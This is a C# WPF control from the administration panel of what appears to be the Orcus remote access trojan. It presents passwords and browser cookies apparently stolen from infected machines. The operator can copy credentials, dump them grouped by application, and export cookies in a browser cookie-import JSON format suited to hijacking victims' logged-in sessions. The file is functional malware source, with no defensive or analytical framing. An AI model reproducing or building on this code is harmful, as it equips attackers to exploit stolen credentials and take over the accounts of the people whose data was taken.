using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows;
using System.Windows.Data;
using Orcus.Administration.Core.Utilities;
using Orcus.Shared.Commands.Password;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.Controls
{
    /// <summary>
    ///     Interaction logic for PasswordsPresenter.xaml
    /// </summary>
    public partial class PasswordsPresenter : INotifyPropertyChanged
    {
        public static readonly DependencyProperty PasswordDataProperty = DependencyProperty.Register(
            "PasswordData", typeof (PasswordData), typeof (PasswordsPresenter),
            new PropertyMetadata(default(PasswordData), PasswordDataPropertyChangedCallback));

        private ICollectionView _cookieCollectionView;
        private string _cookieSearchText;
        private RelayCommand _copyValueCommand;
        private RelayCommand _exportAllCookiesCommand;
        private RelayCommand _exportCookiesCommand;
        private RelayCommand _openPasswordsInEditorCommand;

        private ICollectionView _passwordCollectionView;
        private string _passwordSearchText;

        public PasswordsPresenter()
        {
            InitializeComponent();
        }

        public PasswordData PasswordData
        {
            get { return (PasswordData) GetValue(PasswordDataProperty); }
            set { SetValue(PasswordDataProperty, value); }
        }

        public ICollectionView PasswordCollectionView
        {
            get { return _passwordCollectionView; }
            set
            {
                _passwordCollectionView = value;
                OnPropertyChanged();
            }
        }

        public ICollectionView CookieCollectionView
        {
            get { return _cookieCollectionView; }
            set
            {
                _cookieCollectionView = value;
                OnPropertyChanged();
            }
        }

        public string PasswordSearchText
        {
            get { return _passwordSearchText; }
            set
            {
                _passwordSearchText = value;
                PasswordCollectionView?.Refresh();
            }
        }

        public string CookieSearchText
        {
            get { return _cookieSearchText; }
            set
            {
                _cookieSearchText = value;
                CookieCollectionView?.Refresh();
            }
        }

        public RelayCommand CopyValueCommand
        {
            get
            {
                return _copyValueCommand ?? (_copyValueCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    string clipboardText;
                    var entry = (RecoveredPassword) parameters[0];

                    switch (int.Parse((string) parameters[1]))
                    {
                        case 0:
                            clipboardText = entry.UserName;
                            break;
                        case 1:
                            clipboardText = entry.Password;
                            break;
                        case 2:
                            clipboardText = entry.Field1;
                            break;
                        case 3:
                            clipboardText = entry.Field2;
                            break;
                        default:
                            return;
                    }

                    if (string.IsNullOrEmpty(clipboardText))
                        return;

                    Clipboard.SetText(clipboardText, TextDataFormat.Text);
                }));
            }
        }

        public RelayCommand OpenPasswordsInEditorCommand
        {
            get
            {
                return _openPasswordsInEditorCommand ?? (_openPasswordsInEditorCommand = new RelayCommand(parameter =>
                {
                    var entries = ((IList) parameter).OfType<RecoveredPassword>().ToList();
                    if (entries.Count == 0)
                        return;

                    var stringBuilder = new StringBuilder();
                    foreach (var application in entries.GroupBy(x => x.Application))
                    {
                        stringBuilder.AppendLine($"------------------- {application.Key} -------------------");
                        foreach (var password in application)
                        {
                            if (!string.IsNullOrEmpty(password.UserName))
                                stringBuilder.AppendLine($"Username: {password.UserName}");
                            if (!string.IsNullOrEmpty(password.Password))
                                stringBuilder.AppendLine($"Password: {password.Password}");
                            if (!string.IsNullOrEmpty(password.Field1))
                                stringBuilder.AppendLine($"Field 1: {password.Field1}");
                            if (!string.IsNullOrEmpty(password.Field2))
                                stringBuilder.AppendLine($"Field 2: {password.Field2}");
                            stringBuilder.AppendLine();
                        }

                        stringBuilder.AppendLine();
                    }

                    stringBuilder.Length -= 2;

                    NotepadHelper.ShowMessage(stringBuilder.ToString().TrimEnd(),
                        $"{entries.Count} {Application.Current.Resources["Passwords"]}");
                }));
            }
        }

        public RelayCommand ExportAllCookiesCommand
        {
            get
            {
                return _exportAllCookiesCommand ??
                       (_exportAllCookiesCommand =
                           new RelayCommand(parameter =>
                           {
                               if (PasswordData?.Cookies != null)
                                   ExportCookies(PasswordData.Cookies);
                           }));
            }
        }

        public RelayCommand ExportCookiesCommand
        {
            get
            {
                return _exportCookiesCommand ?? (_exportCookiesCommand = new RelayCommand(parameter =>
                {
                    var cookies = ((IList) parameter).OfType<RecoveredCookie>().ToList();
                    if (cookies.Count == 0)
                        return;

                    ExportCookies(cookies);
                }));
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;

        private void ExportCookies(List<RecoveredCookie> cookies)
        {
            var exportWindow =
                new Views.Dialogs.ExportValuesWindow(
                    new List<string>
                    {
                        "$Host$",
                        "$Name$",
                        "$Value$",
                        "$Path$",
                        "$ExpiresUtc$",
                        "$Secure$",
                        "$HttpOnly$"
                    }, @"{
    ""domain"": ""$Host$"",
    ""expirationDate"": $ExpiresUtc$,
    ""hostOnly"": false,
    ""httpOnly"": $HttpOnly$,
    ""name"": ""$Name$"",
    ""path"": ""$Path$"",
    ""secure"": $Secure$,
    ""session"": false,
    ""storeId"": ""0"",
    ""value"": ""$Value$"",
    ""id"": Auto_Increment
},
")
                {Owner = Window.GetWindow(this)};

            if (exportWindow.ShowDialog() == true)
            {
                var stringBuilder = new StringBuilder();
                for (int i = 0; i < cookies.Count; i++)
                {
                    var cookie = cookies[i];
                    stringBuilder.Append(FormatString(exportWindow.ValueFormat, cookie, i));
                }

                NotepadHelper.ShowMessage(stringBuilder.ToString(),
                    $"{cookies.Count} {Application.Current.Resources["Cookies"]}");
            }
        }

        private string FormatString(string text, RecoveredCookie cookie, int number)
        {
            text = text.Replace("$Host$", cookie.Host, StringComparison.OrdinalIgnoreCase);
            text = text.Replace("$Name$", cookie.Name, StringComparison.OrdinalIgnoreCase);
            text = text.Replace("$Value$", cookie.Value, StringComparison.OrdinalIgnoreCase);
            text = text.Replace("$Path$", cookie.Path, StringComparison.OrdinalIgnoreCase);
            text = text.Replace("$ExpiresUtc$", (cookie.ExpiresUtc - new DateTime(1970, 1, 1)).TotalSeconds.ToString(CultureInfo.InvariantCulture), StringComparison.OrdinalIgnoreCase);
            text = text.Replace("$Secure$", cookie.Secure.ToString().ToLower(), StringComparison.OrdinalIgnoreCase);
            text = text.Replace("$HttpOnly$", cookie.HttpOnly.ToString().ToLower(), StringComparison.OrdinalIgnoreCase);
            text = text.Replace("Auto_Increment", number.ToString(), StringComparison.OrdinalIgnoreCase);

            return text;
        }

        private static void PasswordDataPropertyChangedCallback(DependencyObject dependencyObject,
            DependencyPropertyChangedEventArgs dependencyPropertyChangedEventArgs)
        {
            ((PasswordsPresenter) dependencyObject).LoadPasswordData(
                dependencyPropertyChangedEventArgs.NewValue as PasswordData);
        }

        private void LoadPasswordData(PasswordData passwordData)
        {
            PasswordCollectionView = CollectionViewSource.GetDefaultView(passwordData.Passwords);
            CookieCollectionView = CollectionViewSource.GetDefaultView(passwordData.Cookies);

            PasswordCollectionView.Filter = PasswordFilter;
            CookieCollectionView.Filter = CookiesFilter;

            PasswordCollectionView.Refresh();
            CookieCollectionView.Refresh();
        }

        private bool CookiesFilter(object o)
        {
            var cookie = (RecoveredCookie) o;
            return string.IsNullOrWhiteSpace(CookieSearchText) ||
                   cookie.Host.IndexOf(CookieSearchText, StringComparison.OrdinalIgnoreCase) > -1 ||
                   cookie.ApplicationName.IndexOf(CookieSearchText, StringComparison.OrdinalIgnoreCase) > -1 ||
                   cookie.Path.IndexOf(CookieSearchText, StringComparison.OrdinalIgnoreCase) > -1;
        }

        private bool PasswordFilter(object o)
        {
            var password = (RecoveredPassword) o;
            return string.IsNullOrWhiteSpace(PasswordSearchText) ||
                   password.Application.IndexOf(PasswordSearchText, StringComparison.OrdinalIgnoreCase) > -1 ||
                   password.UserName.StartsWith(PasswordSearchText, StringComparison.OrdinalIgnoreCase) ||
                   password.Field1?.IndexOf(PasswordSearchText, StringComparison.OrdinalIgnoreCase) > -1;
        }

        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}